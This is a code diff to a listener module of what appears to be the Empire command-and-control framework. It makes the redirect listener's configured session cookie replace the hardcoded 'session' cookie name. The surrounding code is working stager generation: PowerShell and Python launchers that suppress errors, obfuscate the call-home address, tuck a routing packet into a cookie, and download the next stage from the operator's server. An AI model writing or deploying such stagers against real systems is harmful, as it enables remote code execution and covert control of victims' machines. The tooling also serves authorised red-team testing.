@@ -127,6 +127,8 @@ class Listener:
         active_listener = self
         # extract the set options for this instantiated listener
         listenerOptions = active_listener.options
+        redirect_name = listenerOptions["RedirectListener"]["Value"]
+        listener = self.mainMenu.listenersv2.get_active_listener_by_name(redirect_name)
 
         host = listenerOptions["Host"]["Value"]
         launcher = listenerOptions["Launcher"]["Value"]
@@ -134,10 +136,9 @@ class Listener:
         profile = listenerOptions["DefaultProfile"]["Value"]
         uris = list(profile.split("|")[0].split(","))
         stage0 = random.choice(uris)
+        cookie = listener.session_cookie
 
         if language == "powershell":
-            # PowerShell
-
             stager = '$ErrorActionPreference = "SilentlyContinue";'
             if safe_checks.lower() == "true":
                 stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
@@ -199,7 +200,7 @@ class Listener:
             b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")
 
             # add the routing packet to a cookie
-            stager += f'$wc.Headers.Add("Cookie","session={b64RoutingPacket}");'
+            stager += f'$wc.Headers.Add("Cookie","{cookie}={b64RoutingPacket}");'
             stager += f"$ser={helpers.obfuscate_call_home_address(host)};$t='{stage0}';$hop='{listener_name}';"
             stager += "$data=$wc.DownloadData($ser+$t);"
 
@@ -277,7 +278,7 @@ class Listener:
                         launcherBase += "o = urllib.request.build_opener(proxy);\n"
 
                         # add the routing packet to a cookie
-                        launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session={b64RoutingPacket}")];\n'
+                        launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "{cookie}={b64RoutingPacket}")];\n'
                     else:
                         username = proxy_creds.split(":")[0]
                         password = proxy_creds.split(":")[1]
@@ -286,7 +287,7 @@ class Listener:
                             proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();
                             proxy_auth_handler.add_password(None,'{proxy}','{username}','{password}');
                             o = urllib.request.build_opener(proxy, proxy_auth_handler);
-                            o.addheaders=[('User-Agent',UA), ("Cookie", "session={b64RoutingPacket}")];
+                            o.addheaders=[('User-Agent',UA), ("Cookie", "{cookie}={b64RoutingPacket}")];
                             """
                         )
                 else:
@@ -345,7 +346,7 @@ class Listener:
         killDate = listener.options["KillDate"]["Value"]
         host = listenerOptions["Host"]["Value"]
         customHeaders = profile.split("|")[2:]
-        session_cookie = ""
+        session_cookie = listener.options["Cookie"]["Value"]
 
         # select some random URIs for staging from the main profile
         stage1 = random.choice(uris)
